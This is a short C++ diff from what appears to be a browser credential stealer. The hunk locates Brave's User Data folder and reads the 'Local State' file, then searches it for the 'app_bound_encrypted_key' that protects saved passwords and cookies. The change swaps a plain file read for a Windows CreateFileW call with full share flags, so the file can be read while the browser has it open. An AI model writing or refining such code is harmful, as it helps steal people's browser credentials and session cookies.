@@ -145,8 +145,23 @@ void do_work() {
         else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
 
         std::string ls_str;
-        std::ifstream ls_file(data_path / "Local State");
-        if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+        fs::path ls_path = data_path / "Local State";
+        HANDLE h_file = CreateFileW(ls_path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+        if (h_file != INVALID_HANDLE_VALUE) {
+            DWORD size = GetFileSize(h_file, NULL);
+            if (size != INVALID_FILE_SIZE && size > 0) {
+                std::vector<char> buffer(size);
+                DWORD read;
+                if (ReadFile(h_file, buffer.data(), size, &read, NULL)) {
+                    ls_str.assign(buffer.begin(), buffer.begin() + read);
+                }
+            }
+            CloseHandle(h_file);
+        }
+        if (ls_str.empty()) {
+            std::ifstream ls_file(ls_path);
+            if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+        }
 
         size_t pos = ls_str.find("\"app_bound_encrypted_key\":\"");
         if (pos == std::string::npos) {
